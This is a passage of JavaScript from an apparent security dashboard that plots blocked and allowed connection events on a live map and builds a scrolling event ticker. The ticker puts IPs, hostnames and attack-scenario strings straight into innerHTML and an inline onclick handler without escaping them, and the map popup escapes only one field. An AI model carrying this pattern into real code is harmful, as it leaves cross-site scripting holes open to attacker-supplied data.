      const shuffledLegit = [...legitEvents].sort(() => 0.5 - Math.random());
      pickedEvents.push(...shuffledLegit.slice(0, 2));
    }

    if (showRadarThreats && blockedEvents.length > 0) {
      const shuffledBlocked = [...blockedEvents].sort(() => 0.5 - Math.random());
      pickedEvents.push(...shuffledBlocked.slice(0, 2));
    }

    pickedEvents.forEach(evt => {
      emitRadarPulseMarker(evt);
    });

    // Update Ticker Stream with interleaved mix of events
    if (tickerContainer) {
      const interleaved = [];
      const maxLen = Math.max(blockedEvents.length, legitEvents.length);
      for (let i = 0; i < maxLen && interleaved.length < 16; i++) {
        if (blockedEvents[i]) interleaved.push(blockedEvents[i]);
        if (legitEvents[i]) interleaved.push(legitEvents[i]);
      }

      const tickerHtml = interleaved.map(e => `
        <div class="ticker-item ${e.type}" onclick="openThreatDossier('${e.ip}')" title="Clique para abrir o Dossiê Forense">
          <div class="ticker-top">
            <span class="ticker-ip">${e.ip}</span>
            <span class="badge ${e.type === 'blocked' ? 'badge-danger' : 'badge-success'}">${e.action}</span>
          </div>
          <div class="ticker-loc">
            <span>📍 ${e.city}, ${e.country}</span>
            <span style="font-size: 0.68rem; color: var(--text-muted);">${e.rdns_hostname ? e.rdns_hostname.substring(0, 22) : 'rDNS'}</span>
          </div>
          ${e.type === 'blocked' ? `<div class="ticker-scen">⚠️ ${e.scenario} &bull; ${e.target_service}</div>` : `<div style="font-size: 0.7rem; color: #86efac; margin-top: 2px;">🟢 ${e.target_service}</div>`}
        </div>
      `).join('');
      tickerContainer.innerHTML = tickerHtml;
    }

  } catch (err) {
    console.error('Radar stream error:', err);
  }
}

function emitRadarPulseMarker(evt) {
  if (!radarMapInstance) return;

  // Add micro-jitter to prevent markers from stacking directly on top of each other
  const jitterLat = (Math.random() - 0.5) * 1.1;
  const jitterLng = (Math.random() - 0.5) * 1.1;
  const lat = (evt.lat || 0) + jitterLat;
  const lng = (evt.lng || 0) + jitterLng;
  const isBlocked = (evt.type === 'blocked');

  // Custom DivIcon for ephemeral pulse
  const pulseIcon = L.divIcon({
    className: isBlocked ? 'radar-pulse-marker-red' : 'radar-pulse-marker-green',
    iconSize: [24, 24],
    iconAnchor: [12, 12]
  });

  const marker = L.marker([lat, lng], { icon: pulseIcon }).addTo(radarMapInstance);

  const popupHtml = `
    <div class="radar-popup-card ${isBlocked ? 'blocked' : 'legit'}">
      <div style="font-weight: 700; color: #ffffff; margin-bottom: 2px;">
        ${isBlocked ? '🛑 ATAQUE BLOQUEADO' : '🟢 ACESSO AUTORIZADO'}
      </div>
      <div><strong>IP:</strong> ${evt.ip} (${evt.city}, ${evt.country})</div>
      <div style="font-size: 0.72rem; color: #94a3b8;">${escapeHtml(evt.rdns_hostname)}</div>
      <div style="margin-top: 3px; font-weight: 600; color: ${isBlocked ? '#f87171' : '#34d399'};">
        ${evt.target_service}
      </div>
    </div>
  `;

  marker.bindPopup(popupHtml, {
    className: 'radar-live-popup',
    autoClose: false,
    closeOnClick: false,
    closeButton: false,
    offset: [0, -10]
  }).openPopup();

  // Auto-remove after 3.5 seconds
  setTimeout(() => {
    try {
      if (radarMapInstance && radarMapInstance.hasLayer(marker)) {
        radarMapInstance.removeLayer(marker);
      }
    } catch (e) {}
  }, 3500);
}
